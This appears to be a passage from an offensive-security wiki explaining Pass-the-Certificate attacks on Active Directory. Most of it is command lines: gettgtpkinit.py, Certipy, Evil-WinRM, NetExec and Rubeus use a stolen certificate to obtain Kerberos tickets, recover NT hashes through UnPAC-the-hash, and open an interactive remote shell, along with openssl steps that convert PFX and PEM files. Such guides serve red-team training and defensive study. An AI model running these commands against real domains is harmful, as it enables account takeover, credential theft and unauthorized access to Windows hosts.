#### PKINITtools

From UNIX-like systems, [Dirk-jan](https://twitter.com/_dirkjan)'s [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py) from [PKINITtools](https://github.com/dirkjanm/PKINITtools/) tool to request a TGT (Ticket Granting Ticket) for the target object. That tool supports the use of the certificate in multiple forms.

```python
# PFX certificate (file) + password (string, optionnal)
gettgtpkinit.py -cert-pfx "PATH_TO_PFX_CERT" -pfx-pass "CERT_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"

# Base64-encoded PFX certificate (string) (password can be set)
gettgtpkinit.py -pfx-base64 $(cat "PATH_TO_B64_PFX_CERT") "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"

# PEM certificate (file) + PEM private key (file)
gettgtpkinit.py -cert-pem "PATH_TO_PEM_CERT" -key-pem "PATH_TO_PEM_KEY" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
```

The ticket obtained can then be used to

- authenticate with pass-the-cache
- conduct an UnPAC-the-hash attack. This can be done with [getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py) from [PKINITtools](https://github.com/dirkjanm/PKINITtools/).
- obtain access to the account's SPN with an S4U2Self. This can be done with [gets4uticket.py](https://github.com/dirkjanm/PKINITtools/blob/master/gets4uticket.py) from PKINITtools.

#### Certipy

When using Certipy for Pass-the-Certificate, it automatically does UnPAC-the-hash to recover the account's NT hash, in addition to saving the obtained TGT.

```shell
certipy auth -pfx <PATH_TO_PFX_CERT> -dc-ip <DC_IP> -username <user> -domain <DOMAIN_FQDN>
```

{% hint style="info" %} Notes that Certipy's commands don't support PFXs with password. The following command can be used to "unprotect" a PFX file.

```shell
certipy cert -export -pfx <PATH_TO_PFX_CERT> -password <CERT_PASSWORD> -out <unprotected.pfx>
```
#### Evil-WinRm

Evil-WinRM uses the WinRM protocol based on Windows Management Instrumentation (WMI)  to give us an interactive shell on a Windows host. Winrm Supports PKINIT, so we can authenticate with a certificate.

```shell
evil-winrm -i <TARGET_IP> -c <PATH_TO_PEM_CERT> -k <PATH_TO_PEM_KEY> -S -r <DOMAIN_REALM>
```

Evil WinRM doesn't directly support PFX files and need a PEM certificate and private key. The following commands can be used to convert a PFX file in PEM formats

```shell
# Exctract PEM certificate
openssl pkcs12 -in <PATH_TO_PFX_CERT> -clcerts -nokeys -out <PATH_TO_NEW_PEM_CERT>
# Extrcat PEM key
openssl pkcs12 -in <PATH_TO_PFX_CERT> -nocerts -out <ENC_PEM_KEY>
openssl rsa -in <ENC_PEM_KEY> -out <FINAL_PEM_KEY>
```

#### NetExec

You can also use [Netexec](https://github.com/Pennyw0rth/NetExec) to perform Pass-the-Certificate authentication:

```shell
netexec <proto> <ip> --cert-pfx "PATH_TO_PFX_CERT" -u user 
netexec <proto> <ip> --cert-pfx "PATH_TO_PFX_CERT" --pfx-pass "CERT_PASSWORD" -u user 
netexec <proto> <ip> --pfx-base64 "PATH_TO_PFX_CERT" -u user 
netexec <proto> <ip> --cert-pem "PATH_TO_CRT" --key-pem "PATH_TO_KEY" -u user
```
 
  From Windows systems, Rubeus (C#) can be used to request a TGT (Ticket Granting Ticket) for the target object from a base64-encoded PFX certificate export (with an optional password).

```shell
Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
```

PEM certificates can be exported to a PFX format with openssl. Rubeus doesn't handle PEM certificates.

```shell
openssl pkcs12 -in "cert.pem" -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out "cert.pfx"
```

Certipy uses DER encryption. To generate a PFX for Rubeus, openssl can be used.

```shell
openssl rsa -inform DER -in key.key -out key-pem.key
openssl x509 -inform DER -in cert.crt -out cert.pem -outform PEM
openssl pkcs12 -in cert.pem -inkey key-pem.key -export -out cert.pfx
```
